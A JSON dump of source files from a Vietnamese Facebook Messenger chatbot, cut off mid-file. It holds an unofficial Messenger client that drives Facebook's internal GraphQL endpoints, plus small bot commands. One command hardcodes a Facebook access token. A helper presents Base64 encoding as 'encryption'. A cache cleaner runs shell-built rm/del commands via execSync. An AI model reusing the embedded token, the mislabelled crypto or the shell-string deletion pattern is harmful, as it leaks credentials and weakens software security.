{"file_contents":{"lib/Fca-Horizon-Remastered/src/createNewGroup.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function createNewGroup(participantIDs, groupTitle, callback) {\n    if (utils.getType(groupTitle) == \"Function\") {\n      callback = groupTitle;\n      groupTitle = null;\n    }\n\n    if (utils.getType(participantIDs) !== \"Array\") throw { error: \"createNewGroup: participantIDs should be an array.\" };\n\n    if (participantIDs.length < 2) throw { error: \"createNewGroup: participantIDs should have at least 2 IDs.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, threadID) {\n        if (err) return rejectFunc(err);\n        resolveFunc(threadID);\n      };\n    }\n\n    var pids = [];\n    for (var n in participantIDs) pids.push({ fbid: participantIDs[n] });\n    pids.push({ fbid: ctx.userID });\n\n    var form = {\n      fb_api_caller_class: \"RelayModern\",\n      fb_api_req_friendly_name: \"MessengerGroupCreateMutation\",\n      av: ctx.userID,\n      //This doc_id is valid as of January 11th, 2020\n      doc_id: \"577041672419534\",\n      variables: JSON.stringify({\n        input: {\n          entry_point: \"jewel_new_group\",\n          actor_id: ctx.userID,\n          participants: pids,\n          client_mutation_id: Math.round(Math.random() * 1024).toString(),\n          thread_settings: {\n            name: groupTitle,\n            joinable_mode: \"PRIVATE\",\n            thread_image_fbid: null\n          }\n        }\n      })\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.errors) throw resData;\n        return callback(null, resData.data.messenger_group_thread_create.thread.thread_key.thread_fbid);\n      })\n      .catch(function (err) {\n        log.error(\"createNewGroup\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2158,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Security/Base/Step_2.js":{"content":"'use strict';\n\nvar CryptoJS = require(\"crypto-js\");\n\n/**\n * Encrypt the text using the CryptoJS library and return the encrypted text as a Base64 string.\n * @param Data - The data to be encrypted.\n * @returns A string of characters that represent the encrypted data.\n */\nmodule.exports.Encrypt = function Encrypt(Data) {\n    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(Data));\n};\n\n/**\n * Decrypt the data using the CryptoJS library, and return the decrypted data as a string.\n * @param Data - The data to be decrypted.\n * @returns The decrypted data.\n */\n\nmodule.exports.Decrypt = function Decrypt(Data) {\n    return CryptoJS.enc.Base64.parse(Data).toString(CryptoJS.enc.Utf8);\n};\n","path":null,"size_bytes":698,"size_tokens":null},"lib/tiktok.js":{"content":"const axios = require('axios');\nconst searchVideo = async (keywords) => {\n  var { data } = await axios(`https://api.phamvandien.xyz/tiktok?search=${encodeURI(keywords)}`);\n  return data\n};\n\nconst getData = async (url) => {\n  var { data } = await axios(`https://api.phamvandien.xyz/tiktok?url=${url}`);\n  return data\n};\nconst getInfoUser = async (username) => {\n  var { data } = await axios.get(`https://api.phamvandien.xyz/tiktok?username=${username}`)\n  return data\n}\n\nmodule.exports = {\n  getData,\n  searchVideo,\n  getInfoUser\n}\n","path":null,"size_bytes":531,"size_tokens":null},"modules/commands/morse.js":{"content":"const fs = require('fs');\n\nmodule.exports.config = {\n    name: \"morse\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chuy·ªÉn ƒë·ªïi vƒÉn b·∫£n th√†nh m√£ Morse v√† ng∆∞·ª£c l·∫°i\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"[encode|decode] [vƒÉn b·∫£n|m√£ Morse]\",\n    cooldowns: 5\n};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    const { threadID, messageID } = event;\n\n    if (args.length < 2) {\n        return api.sendMessage(\"S·ª≠ d·ª•ng: morse [encode|decode] [vƒÉn b·∫£n|m√£ Morse]\", threadID, messageID);\n    }\n\n    const mode = args[0].toLowerCase();\n    const input = args.slice(1).join(\" \");\n\n    if (mode === \"encode\") {\n        const morse = textToMorse(input);\n        return api.sendMessage(`M√£ Morse: ${morse}`, threadID, messageID);\n    } else if (mode === \"decode\") {\n        const text = morseToText(input);\n        return api.sendMessage(`VƒÉn b·∫£n: ${text}`, threadID, messageID);\n    } else {\n        return api.sendMessage(\"Ch·∫ø ƒë·ªô kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng: morse [encode|decode] [vƒÉn b·∫£n|m√£ Morse]\", threadID, messageID);\n    }\n};\n\nconst morseCode = {\n    'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',\n    'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',\n    'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--', 'Z': '--..',\n    '0': '-----', '1': '.----', '2': '..---', '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..', '9': '----.',\n    ' ': '/'\n};\n\nconst textToMorse = (text) => {\n    return text.toUpperCase().split('').map(char => morseCode[char] || char).join(' ');\n};\n\nconst morseToText = (morse) => {\n    const morseToChar = Object.fromEntries(Object.entries(morseCode).map(([char, morse]) => [morse, char]));\n    return morse.split(' ').map(code => morseToChar[code] || code).join('');\n};\n","path":null,"size_bytes":1988,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUserInfoMain.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatData(data) {\n  var retObj = {};\n\n  for (var prop in data) {\n    // eslint-disable-next-line no-prototype-builtins\n    if (data.hasOwnProperty(prop)) {\n      var innerObj = data[prop];\n      retObj[prop] = {\n        name: innerObj.name,\n        firstName: innerObj.firstName,\n        vanity: innerObj.vanity,\n        thumbSrc: innerObj.thumbSrc,\n        profileUrl: innerObj.uri,\n        gender: innerObj.gender,\n        type: innerObj.type,\n        isFriend: innerObj.is_friend,\n        isBirthday: !!innerObj.is_birthday\n      };\n    }\n  }\n\n  return retObj;\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getUserInfo(id, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, userInfo) {\n        if (err) return rejectFunc(err);\n        resolveFunc(userInfo);\n      };\n    }\n\n    if (utils.getType(id) !== \"Array\") id = [id];\n\n    var form = {};\n    id.map(function (v, i) {\n      form[\"ids[\" + i + \"]\"] = v;\n    });\n    defaultFuncs\n      .post(\"https://www.facebook.com/chat/user_info/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback(null, formatData(resData.payload.profiles));\n      })\n      .catch(function (err) {\n        log.error(\"getUserInfo\", \"L·ªói: getUserInfo C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu !,H√£y Th·ª≠ L·∫°i !\");\n        return callback(err);\n      });\n    return returnPromise;\n  };\n};","path":null,"size_bytes":1770,"size_tokens":null},"lib/fca-auto/Func/ClearCache.js":{"content":"\"use strict\";\nconst { execSync } = require('child_process');\nvar utils = require(\"../utils\");\nvar log = require(\"../logger\");\nvar Object = ['png','json','wav','mp3','mp4','jpg','txt','gif','tff','m4a'];\nvar Recommend = ['png','wav','mp3','mp4','jpg','m4a'];\nmodule.exports = function (defaultFuncs, api, ctx) {\n    return function (Args,callback) {\n        let New1 = [];\n        if (!Args.New || utils.getType(Args.New) !== \"Array\") { \n            New1 = Recommend;\n            log.Normal(\"Kh√¥ng C√≥ Adding Th√™m, Ti·∫øn H√†nh S·ª≠ D·ª•ng Theo H·ªá Th·ªëng Ch·ªâ ƒê·ªãnh !\");\n        }\n        else {\n            for (let i = 0; i < Args.New.length; i++) {\n                if (Object.indexOf(Args.New[i]) === -1) {\n                    log.Normal('Kh√¥ng t√¨m th·∫•y file ' + Args.New[i] + ' trong danh s√°ch ƒë·ªãnh d·∫°ng');\n                    return;\n                }\n                New1.push(Args.New[i]);\n            }\n        }\n        var resolveFunc = function () { };\n        var rejectFunc = function () { };\n        var returnPromise = new Promise(function (resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function (err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n        switch (process.platform) {\n            case 'linux': {\n                for (let i = 0; i < New1.length; i++) {\n                    log.Normal('ƒêang Clear Lo·∫°i File ' + New1[i]);\n                    var STR = String(`find ./modules -type f -iname \\'*.${New1[i]}\\' -exec rm {} \\\\;`);\n                    execSync(STR);\n                }\n                log.Normal('Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n                callback(null, 'Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n            }\n            break;\n            case \"win32\": {\n                var cmd = \"del /q /s /f /a \";\n                for (let i = 0; i < New1.length; i++) {\n                    log.Normal('ƒêang Clear Lo·∫°i File ' + New1[i]);\n                    let STR = String(cmd + '.\\\\modules\\\\*.' + New1[i] + '\"');\n                    execSync(STR, { stdio: 'inherit' });\n                }\n                log.Normal('Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n                callback(null, 'Th√†nh C√¥ng Clear ' + New1.length + ' Lo·∫°i File !');\n            }\n            break;\n            default: {\n                return log.Error('Not Supported');\n            }\n        }\n        return returnPromise;\n    };\n};\n","path":null,"size_bytes":2601,"size_tokens":null},"modules/commands/infobaihat.js":{"content":"const axios = require(\"axios\"); // Th∆∞ vi·ªán HTTP\nconst fs = require(\"fs\"); // Qu·∫£n l√Ω file\nconst path = require(\"path\"); // Qu·∫£n l√Ω ƒë∆∞·ªùng d·∫´n file\n\nmodule.exports.config = {\n  name: \"infobaihat\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"TatsuYTB\",\n  description: \"L·∫•y th√¥ng tin b√†i h√°t t·ª´ iTunes\",\n  commandCategory: \"C√¥ng c·ª•\",\n  usages: \"[T√™n b√†i h√°t]\",\n  cooldowns: 5,\n};\n\nmodule.exports.run = async function ({ api, event, args }) {\n  const { threadID, messageID } = event;\n\n  if (args.length === 0) {\n    return api.sendMessage(\n      \"Vui l√≤ng nh·∫≠p t√™n b√†i h√°t.\\nV√≠ d·ª•: #infobaihat Anh M·ªát R·ªìi\",\n      threadID,\n      messageID\n    );\n  }\n\n  const query = args.join(\" \");\n  const apiURL = `https://api.popcat.xyz/itunes?q=${encodeURIComponent(query)}`;\n\n  try {\n    const response = await axios.get(apiURL);\n    const data = response.data;\n\n    if (!data || !data.name) {\n      return api.sendMessage(\n        `Kh√¥ng t√¨m th·∫•y th√¥ng tin b√†i h√°t n√†o ph√π h·ª£p v·ªõi t·ª´ kh√≥a: \"${query}\".`,\n        threadID,\n        messageID\n      );\n    }\n\n    const thumbnailPath = path.resolve(__dirname, `./cache/${Date.now()}_thumbnail.jpg`);\n    const thumbnailResponse = await axios.get(data.thumbnail, { responseType: \"arraybuffer\" });\n    fs.writeFileSync(thumbnailPath, Buffer.from(thumbnailResponse.data, \"binary\"));\n\n    const message = `\nüéµ Th√¥ng tin b√†i h√°t:\n-T√™n b√†i h√°t: ${data.name}\n-Ca sƒ©: ${data.artist}\n-Album: ${data.album}\n-Ng√†y t·∫£i l√™n Album: ${data.release_date}\n-Th·ªùi l∆∞·ª£ng: ${data.length}\n-Th·ªÉ lo·∫°i: ${data.genre}\n-Nghe t·∫°i ƒë√¢y: ${data.url}\n`;\n\n    api.sendMessage(\n      {\n        body: message,\n        attachment: fs.createReadStream(thumbnailPath),\n      },\n      threadID,\n      () => {\n        fs.unlinkSync(thumbnailPath);\n      },\n      messageID\n    );\n  } catch (error) {}\n};\n","path":null,"size_bytes":1887,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getThreadInfoOLD.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  var { createData,getData,hasData,setLastRun,updateData, getAll } = require('../Extra/ExtraGetThread');\n  var { capture } = require('../Extra/Src/Last-Run');\n  var Database = require('../Extra/Database');\n  global.Fca.Data.Userinfo = [];\n  \n  return function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n\n      // ƒë∆∞·ª£c t√¨m th·∫•y v√†o gi·ªØa th√°ng 8/2022 b·ªüi @KanzuWakazaki - ƒë√£ ƒë∆∞·ª£c chia s·∫ª cho @D-Jukie v√† Horizon Team Public group ü§¥\n      // nh·ªØng code t∆∞∆°ng t·ª± muliti thread nh∆∞ n√†y ƒë·ªÅu c√≥ th·ªÉ l√† copy idea üêß\n      // ƒë√£ √°p d·ª•ng v√†o fca m·ªõi(cloud - fca(private)) v√†o cu·ªëi th√°ng 8/2022 b·ªüi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team\n      //c·∫≠p nh·∫≠t d·ª± √°n b·ªã b·ªè r∆°i n√†y v√†o ng√†y 19/11/2022 b·ªüi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nh·∫±m ƒë√°p ·ª©ng nhu c·∫ßu c·ªßa client !\n\n      if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n\n\n    var SpecialMethod = function(TID) {\n      const All = getAll();\n      const Real = [];\n      const Average = [];\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          if (i.data.TimeCreate + 900 * 1000 <= Date.now()) {\n            Real.push(i.data.threadID);\n          }\n          else {\n            Average.push({\n              threadID: i.data.threadID,\n              TimeCreate: i.data.TimeCreate\n            });\n            continue;\n          }\n        } else continue;\n      }\n    const AllofThread = [];\n    if (Average.length > 0) {\n      var Time = 0;\n      for (let i of Average) {\n        Time += i.TimeCreate;\n      }\n      Time = Time / Average.length;\n      if (Time + 900 * 1000 <= Date.now()) {\n        for (let i of Average) {\n          Real.push(i.threadID);\n        }\n      } //can't =))\n      else {\n        setTimeout(function () {\n          SpecialMethod(TID);\n        }, Time + 900 * 1000 - Date.now());\n      }\n    }\n    else {\n      setTimeout(function () {\n        SpecialMethod(TID);\n      }, 900 * 1000);\n    }\n    if (Real.length == 0) return;\n    else if (Real.length == 1) {\n      return DefaultMethod(TID);\n    } \n    else if (All.length > 1) {\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          AllofThread.push(i.data.threadID);\n        } else continue;\n      }\n      var Form = {};\n      var ThreadInfo = [];\n        \n        AllofThread.map(function (x,y) {\n          Form[\"o\" + y] = {\n            doc_id: \"3449967031715030\",\n            query_params: {\n              id: x,\n              message_limit: 0,\n              load_messages: false,\n              load_read_receipts: false,\n              before: null\n            }\n          };\n        });\n  \n        var form = {\n          queries: JSON.stringify(Form),\n          batch_name: \"MessengerGraphQLThreadFetcher\"\n        };\n  \n        defaultFuncs\n        .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(function(resData) {\n          if (resData.error) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          if (resData[resData.length - 1].error_results !== 0) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          resData = resData.splice(0, resData.length - 1);\n          resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n          resData.map(function (x,y) {\n            ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n          });\n            try {\n            if (Object.keys(resData).length == 1) {\n              updateData(threadID,ThreadInfo[0]);\t\n              if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n                for (let i of ThreadInfo[0].userInfo) {\n                  if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                    global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n                  }\n                  global.Fca.Data.Userinfo.push(i);\n                }\n              }\n            } else {\n              for (let i of ThreadInfo) {\n                updateData(i.threadID,i);\n                if (utils.getType(i.userInfo) == \"Array\") {\n                  for (let ii of i.userInfo) {\n                    if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                      global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                    }\n                    global.Fca.Data.Userinfo.push(ii);\n                  }\n                }\n              }\n            }\n          }\n        catch (e) {\n          console.log(e);\n        }\n        })\n        .catch(function(err){\n          throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n        });\n      }\n    };\n\n    var DefaultMethod = function(TID) { \n      var ThreadInfo = [];\n      for (let i of TID) {\n        ThreadInfo.push(getData(i));\n      }\n      if (ThreadInfo.length == 1) {\n        callback(null,ThreadInfo[0]);\n        if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n          for (let i of ThreadInfo[0].userInfo) {\n            if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n              global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n            }\n            global.Fca.Data.Userinfo.push(i);\n          }\n      } else {\n        for (let i of ThreadInfo) {\n          if (utils.getType(i.userInfo) == \"Array\") {\n            for (let ii of i.userInfo) {\n              if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(ii);\n            }\n          }\n        }\n        callback(null,ThreadInfo);\n      }\n    }\n  };\n    var CreateMethod = function(TID) { \n      var Form = {};\n      var ThreadInfo = [];\n\n      TID.map(function (x,y) {\n        Form[\"o\" + y] = {\n          doc_id: \"3449967031715030\",\n          query_params: {\n            id: x,\n            message_limit: 0,\n            load_messages: false,\n            load_read_receipts: false,\n            before: null\n          }\n        };\n      });\n\n      var form = {\n        queries: JSON.stringify(Form),\n        batch_name: \"MessengerGraphQLThreadFetcher\"\n      };\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function(resData) {\n        if (resData.error) {\n          throw resData.error;\n        }\n        if (resData[resData.length - 1].error_results !== 0) {\n          throw resData.error;\n        }\n        resData = resData.splice(0, resData.length - 1);\n        resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n        resData.map(function (x,y) {\n          ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n        });\n        if (Object.keys(resData).length == 1) {\n          createData(threadID,ThreadInfo[0]);\t\n          callback(null, ThreadInfo[0]);\n          capture(callback);\n          setLastRun('LastUpdate', callback);\n          if (global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = [];\n          if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n            for (let i of ThreadInfo[0].userInfo) {\n              if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(i);\n            }\n          }\n        } else {\n          // api.Horizon_Data([ThreadInfo], \"Threads\", \"Post\");\n          for (let i of ThreadInfo) {\n            createData(i.threadID,i);\n            if (utils.getType(i.userInfo) == \"Array\") {\n              for (let ii of i.userInfo) {\n                if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                  global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                }\n                global.Fca.Data.Userinfo.push(ii);\n              }\n            }\n          }\n          callback(null, ThreadInfo);\n        }\n      })\n      .catch(function(err){\n        throw err;\n      });\n    };\n    if (global.Fca.Data.Already != true) { SpecialMethod(threadID); global.Fca.Data.Already = true; setInterval(function(){Database(true).set('UserInfo', global.Fca.Data.Userinfo); delete global.Fca.Data.Userinfo; global.Fca.Data.Userinfo = []; }, 900 * 1000); } \n    \n    try {\n      for (let i of threadID) {\n        switch (hasData(i)) {\n            case true: {     \n              DefaultMethod(threadID);\n              break;\n            }\n          case false: {\n            CreateMethod(threadID);\n            break;\n          }\n        }\n      }\n    }\n    catch (err) {\n      console.log(err);\n    }\n    return returnPromise;\n  };\n};","path":null,"size_bytes":15115,"size_tokens":null},"modules/commands/domin.js":{"content":"module.exports.config = {\n    name: \"domin\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"D√≤ m√¨n\",\n    commandCategory: \"Tr√≤ Ch∆°i\",\n    usages: \"\",\n    cooldowns: 0\n  };\n  \n  const fs = require(\"fs-extra\");\n  const dirpath = __dirname + `/data/domin/`;\n  const { loadImage, createCanvas } = require(\"canvas\");\n  var texthelp = \"H∆∞·ªõng d·∫´n:\\n\" +\n  \"1. B·∫£ng ch∆°i ƒë∆∞·ª£c chia th√†nh 70 √¥ nh·ªè trong ƒë√≥ c√≥ 10 √¥ l√† m√¨n, c√°c √¥ kh√¥ng g·∫ßn m√¨n s·∫Ω ƒë∆∞·ª£c ƒë√†o s·∫µn.\\n\"+\n  \"2. N·∫øu ƒë√†o tr√∫ng √¥ ch·ª©a m√¨n, tr√≤ ch∆°i k·∫øt th√∫c v√† ng∆∞·ªùi ch∆°i thua. N·∫øu ƒë√†o √¥ kh√¥ng ch·ª©a m√¨n, √¥ ƒë√≥ s·∫Ω hi·ªÉn th·ªã s·ªë l∆∞·ª£ng √¥ c√≥ m√¨n xung quanh n√≥.\\n\" +\n  \"3. D·ª±a v√†o c√°c con s·ªë n√†y, ng∆∞·ªùi ch∆°i ph·∫£i suy lu·∫≠n v·ªã tr√≠ c·ªßa c√°c √¥ c√≥ m√¨n v√† ƒë√°nh d·∫•u ch√∫ng.\\n\" +\n  \"4. Ng∆∞·ªùi ch∆°i s·∫Ω chi·∫øn th·∫Øng khi ƒë√†o l√™n 60 √¥ m√† kh√¥ng ƒë·ª•ng qu·∫£ m√¨n n√†o.\\n\" +\n  \"5. T∆∞∆°ng t√°c v·ªõi tr√≤ ch∆°i b·∫±ng c√∫ ph√°p: <h√†nh ƒë·ªông> <t·ªça ƒë·ªô>\\n\" +\n  \"Vd: 1 E5 (ƒë√†o √¥ c√≥ t·ªça ƒë·ªô E5).\"\n  async function draw(map,id) {\n    const canvas = createCanvas(1200, 1000);\n    const ctx = canvas.getContext('2d');\n    var avatar = await loadImage(`https://graph.facebook.com/${id}/picture?width=512&height=512&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`);\n    ctx.drawImage(avatar, 520, 10, 160, 160);\n    var background = await loadImage(\"https://raw.githubusercontent.com/KhoaDo472005/minesweeper/main/board.png\");\n    ctx.drawImage(background, 0, 0, 1200, 1000);\n    var texture1 = await loadImage(\"https://raw.githubusercontent.com/KhoaDo472005/minesweeper/main/texture1.png\");\n    var texture2 = await loadImage(\"https://raw.githubusercontent.com/KhoaDo472005/minesweeper/main/texture2.png\");\n    var co = await loadImage(\"https://raw.githubusercontent.com/KhoaDo472005/minesweeper/main/co.png\");\n    for (let i = 0; i < 10; i++) {\n      for (let j = 0; j < 7; j++) {\n        const o = map[i][j];\n        if (o.opened) {\n          ctx.drawImage(texture2, 100+100*i, 800-100*j, 100, 100);\n          if (o.isMine) {\n            var mine = await loadImage(\"https://raw.githubusercontent.com/KhoaDo472005/minesweeper/main/bomb.png\");\n            ctx.drawImage(mine, 100+100*i, 800-100*j, 100, 100);\n          } else {\n            var number = await loadImage(`https://raw.githubusercontent.com/KhoaDo472005/minesweeper/main/no${o.adjacentMines}.png`);\n            ctx.drawImage(number, 100+100*i, 800-100*j, 100, 100);\n          }\n        } else {\n          ctx.drawImage(texture1, 100+100*i, 800-100*j, 100, 100);\n          if 